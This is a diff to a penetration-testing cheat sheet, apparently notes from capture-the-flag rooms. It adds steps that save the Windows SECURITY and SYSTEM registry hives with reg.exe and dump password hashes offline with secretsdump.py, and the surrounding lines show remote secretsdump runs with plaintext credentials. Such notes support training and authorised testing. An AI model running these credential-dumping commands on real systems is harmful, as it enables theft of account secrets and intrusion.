@@ -89,6 +89,16 @@ python3 secretsdump.py vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.100.15
 python3 secretsdump.py spookysec.local/backup:backup2517860@10.10.248.93
 ````
 ![spooky](https://user-images.githubusercontent.com/75596877/130284812-511a8141-5917-4954-8c29-e623c1edce36.png)
+#### Secretsdump Local 
+- Exfil the registry hives 
+````
+reg.exe save hklm\security C:\temp\security.save
+reg.exe save hklm\system C:\temp\system.save
+````
+- Extract hashes from exfiled SECURITY and SYSTEM
+````
+python3 secretsdump.py -security security.save -system system.save LOCAL
+````
 
 #### Another Cheatsheet
 - https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
